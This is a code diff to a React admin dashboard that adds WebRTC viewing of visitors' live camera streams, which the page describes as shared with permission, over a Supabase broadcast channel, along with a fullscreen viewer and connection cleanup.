@@ -34,9 +34,62 @@ import { CameraCapture, getSupabaseClient, isSupabaseConfigured } from "@/lib/su
 
 interface LiveStreamFeed {
   sessionId: string;
-  frame: string;
+  frame?: string;
+  mediaStream?: MediaStream;
   deviceType: string;
   lastUpdated: number;
+}
+
+const RTC_CONFIG: RTCConfiguration = {
+  iceServers: [
+    { urls: "stun:stun.l.google.com:19302" },
+    { urls: "stun:stun1.l.google.com:19302" },
+  ],
+};
+
+function LiveStreamVideoPlayer({
+  stream,
+  className = "w-full h-full object-cover",
+}: {
+  stream: LiveStreamFeed;
+  className?: string;
+}) {
+  const videoRef = React.useRef<HTMLVideoElement | null>(null);
+  const [hasVideoTrack, setHasVideoTrack] = useState(false);
+
+  useEffect(() => {
+    const video = videoRef.current;
+    if (video && stream.mediaStream) {
+      video.srcObject = stream.mediaStream;
+      video
+        .play()
+        .then(() => setHasVideoTrack(true))
+        .catch(() => setHasVideoTrack(false));
+    } else {
+      setHasVideoTrack(false);
+    }
+  }, [stream.mediaStream]);
+
+  return (
+    <div className="relative w-full h-full bg-zinc-950 flex items-center justify-center">
+      {stream.mediaStream && (
+        <video
+          ref={videoRef}
+          autoPlay
+          playsInline
+          muted
+          className={`${className} ${hasVideoTrack ? "block" : "hidden"}`}
+        />
+      )}
+      {(!hasVideoTrack || !stream.mediaStream) && stream.frame && (
+        <img
+          src={stream.frame}
+          alt={`Live stream ${stream.sessionId}`}
+          className={className}
+        />
+      )}
+    </div>
+  );
 }
 
 const isVideoCapture = (capture: CameraCapture) =>
@@ -52,6 +105,8 @@ export default function AdminDashboardPage() {
 
   const [captures, setCaptures] = useState<CameraCapture[]>([]);
   const [liveStreams, setLiveStreams] = useState<Record<string, LiveStreamFeed>>({});
+  const [selectedLiveSessionId, setSelectedLiveSessionId] = useState<string | null>(null);
+  const peersRef = React.useRef<Record<string, RTCPeerConnection>>({});
   const [loading, setLoading] = useState(true);
   const [isRefreshing, setIsRefreshing] = useState(false);
   const [realtimeActive, setRealtimeActive] = useState(false);
@@ -138,7 +193,75 @@ export default function AdminDashboardPage() {
             });
 
           const liveChannel = supabase
-            .channel("live-camera-stream")
+            .channel("live-camera-stream", {
+              config: { broadcast: { self: true } },
+            })
+            .on("broadcast", { event: "webrtc-offer" }, async ({ payload }) => {
+              if (!payload?.sessionId || !payload?.sdp) return;
+              const sessionId = payload.sessionId as string;
+
+              try {
+                if (peersRef.current[sessionId]) {
+                  peersRef.current[sessionId].close();
+                }
+
+                const pc = new RTCPeerConnection(RTC_CONFIG);
+                peersRef.current[sessionId] = pc;
+
+                pc.ontrack = (event) => {
+                  const remoteStream = event.streams?.[0] || new MediaStream([event.track]);
+                  setLiveStreams((prev) => ({
+                    ...prev,
+                    [sessionId]: {
+                      sessionId,
+                      frame: prev[sessionId]?.frame,
+                      mediaStream: remoteStream,
+                      deviceType: payload.deviceType || prev[sessionId]?.deviceType || "desktop",
+                      lastUpdated: Date.now(),
+                    },
+                  }));
+                };
+
+                pc.onicecandidate = (event) => {
+                  if (event.candidate) {
+                    liveChannel.send({
+                      type: "broadcast",
+                      event: "webrtc-ice-admin",
+                      payload: {
+                        sessionId,
+                        candidate: event.candidate.toJSON(),
+                      },
+                    });
+                  }
+                };
+
+                await pc.setRemoteDescription(new RTCSessionDescription(payload.sdp));
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+
+                liveChannel.send({
+                  type: "broadcast",
+                  event: "webrtc-answer",
+                  payload: {
+                    sessionId,
+                    sdp: pc.localDescription,
+                  },
+                });
+              } catch (err) {
+                console.warn("WebRTC answer error:", err);
+              }
+            })
+            .on("broadcast", { event: "webrtc-ice-sender" }, async ({ payload }) => {
+              if (!payload?.sessionId || !payload?.candidate) return;
+              const pc = peersRef.current[payload.sessionId];
+              if (pc && pc.remoteDescription) {
+                try {
+                  await pc.addIceCandidate(new RTCIceCandidate(payload.candidate));
+                } catch {
+                  // Ignore ICE candidate race errors
+                }
+              }
+            })
             .on("broadcast", { event: "video-frame" }, ({ payload }) => {
               if (!payload?.sessionId || !payload?.frame) return;
               setLiveStreams((prev) => ({
@@ -146,6 +269,7 @@ export default function AdminDashboardPage() {
                 [payload.sessionId]: {
                   sessionId: payload.sessionId,
                   frame: payload.frame,
+                  mediaStream: prev[payload.sessionId]?.mediaStream,
                   deviceType: payload.deviceType || "desktop",
                   lastUpdated: Date.now(),
                 },
@@ -153,13 +277,27 @@ export default function AdminDashboardPage() {
             })
             .on("broadcast", { event: "stream-end" }, ({ payload }) => {
               if (!payload?.sessionId) return;
+              if (peersRef.current[payload.sessionId]) {
+                try {
+                  peersRef.current[payload.sessionId].close();
+                } catch {}
+                delete peersRef.current[payload.sessionId];
+              }
               setLiveStreams((prev) => {
                 const next = { ...prev };
                 delete next[payload.sessionId];
                 return next;
               });
             })
-            .subscribe();
+            .subscribe((subStatus) => {
+              if (subStatus === "SUBSCRIBED") {
+                liveChannel.send({
+                  type: "broadcast",
+                  event: "admin-request-stream",
+                  payload: { timestamp: Date.now() },
+                });
+              }
+            });
 
           const cleanupTimer = setInterval(() => {
             const now = Date.now();
@@ -167,9 +305,18 @@ export default function AdminDashboardPage() {
               let changed = false;
               const next: Record<string, LiveStreamFeed> = {};
               for (const [k, v] of Object.entries(prev)) {
-                if (now - v.lastUpdated < 6000) {
+                const hasLiveTrack = v.mediaStream
+                  ?.getVideoTracks()
+                  .some((t) => t.readyState === "live");
+                if (now - v.lastUpdated < 6000 || hasLiveTrack) {
                   next[k] = v;
                 } else {
+                  if (peersRef.current[k]) {
+                    try {
+                      peersRef.current[k].close();
+                    } catch {}
+                    delete peersRef.current[k];
+                  }
                   changed = true;
                 }
               }
@@ -179,6 +326,12 @@ export default function AdminDashboardPage() {
 
           return () => {
             clearInterval(cleanupTimer);
+            Object.values(peersRef.current).forEach((pc) => {
+              try {
+                pc.close();
+              } catch {}
+            });
+            peersRef.current = {};
             supabase.removeChannel(channel);
             supabase.removeChannel(liveChannel);
           };
@@ -541,31 +694,28 @@ export default function AdminDashboardPage() {
               </h2>
             </div>
             <span className="text-xs text-zinc-400 hidden sm:inline">
-              Streams appear automatically when a visitor grants live video permission
+              Click any live feed to expand full-screen
             </span>
           </div>
 
           {Object.keys(liveStreams).length === 0 ? (
-            <div className="rounded-2xl border border-white/10 bg-black/40 p-6 text-center text-xs sm:text-sm text-zinc-400 flex flex-col items-center gap-2">
-              <Video className="w-6 h-6 text-purple-400/70" />
-              <span>No active live streams right now. Open the camera page and grant permission to test live streaming.</span>
+            <div className="rounded-2xl border border-white/10 bg-black/40 p-8 text-center text-xs sm:text-sm text-zinc-400 flex flex-col items-center gap-2">
+              <Video className="w-7 h-7 text-purple-400/70" />
+              <span>No active live streams right now. When a visitor grants permission and starts live video, their live feed appears here immediately.</span>
             </div>
           ) : (
             <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
               {Object.values(liveStreams).map((stream) => (
                 <div
                   key={stream.sessionId}
-                  className="rounded-2xl overflow-hidden border border-rose-500/40 bg-black shadow-[0_0_25px_rgba(244,63,94,0.2)]"
+                  onClick={() => setSelectedLiveSessionId(stream.sessionId)}
+                  className="group cursor-pointer rounded-2xl overflow-hidden border border-rose-500/40 hover:border-rose-400 bg-black shadow-[0_0_25px_rgba(244,63,94,0.2)] transition-all"
                 >
                   <div className="relative aspect-video bg-zinc-950">
-                    <img
-                      src={stream.frame}
-                      alt={`Live stream ${stream.sessionId}`}
-                      className="w-full h-full object-cover"
-                    />
+                    <LiveStreamVideoPlayer stream={stream} />
                     <div className="absolute top-2.5 left-2.5 px-2.5 py-1 rounded-full bg-rose-600/90 text-white text-[10px] font-bold flex items-center gap-1.5">
                       <span className="w-1.5 h-1.5 rounded-full bg-white animate-ping" />
-                      LIVE
+                      {stream.mediaStream ? "LIVE HD" : "LIVE"}
                     </div>
                     <div className="absolute top-2.5 right-2.5 px-2.5 py-1 rounded-full bg-black/70 border border-white/10 text-[10px] text-zinc-200 capitalize">
                       {stream.deviceType}
@@ -573,13 +723,49 @@ export default function AdminDashboardPage() {
                   </div>
                   <div className="px-3.5 py-2.5 bg-zinc-900/90 flex items-center justify-between text-xs">
                     <span className="font-mono text-purple-300 font-semibold">{stream.sessionId}</span>
-                    <span className="text-[11px] text-emerald-400">Streaming now</span>
+                    <span className="text-[11px] text-emerald-400 flex items-center gap-1">
+                      <Eye className="w-3.5 h-3.5" /> Watch Fullscreen
+                    </span>
                   </div>
                 </div>
               ))}
             </div>
           )}
         </div>
+
+        {/* Expanded Live Stream Monitor Modal */}
+        {selectedLiveSessionId && liveStreams[selectedLiveSessionId] && (
+          <div className="fixed inset-0 z-50 bg-black/90 backdrop-blur-xl flex items-center justify-center p-4 sm:p-6">
+            <div className="relative w-full max-w-5xl rounded-3xl border border-rose-500/40 bg-zinc-950 overflow-hidden shadow-2xl">
+              <div className="flex items-center justify-between px-5 py-3.5 border-b border-white/10 bg-zinc-900/80">
+                <div className="flex items-center gap-3">
+                  <span className="px-3 py-1 rounded-full bg-rose-600 text-white text-xs font-bold flex items-center gap-1.5">
+                    <span className="w-2 h-2 rounded-full bg-white animate-ping" />
+                    LIVE STREAM
+                  </span>
+                  <span className="font-mono text-sm text-purple-300 font-semibold">
+                    {selectedLiveSessionId}
+                  </span>
+                  <span className="text-xs text-zinc-400 capitalize">
+                    ({liveStreams[selectedLiveSessionId].deviceType})
+                  </span>
+                </div>
+                <button
+                  onClick={() => setSelectedLiveSessionId(null)}
+                  className="p-2 rounded-full bg-white/10 hover:bg-white/20 text-white transition"
+                >
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+              <div className="relative w-full aspect-video bg-black">
+                <LiveStreamVideoPlayer
+                  stream={liveStreams[selectedLiveSessionId]}
+                  className="w-full h-full object-contain"
+                />
+              </div>
+            </div>
+          </div>
+        )}
 
         {/* Filter & Search Bar */}
         <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 pt-2">
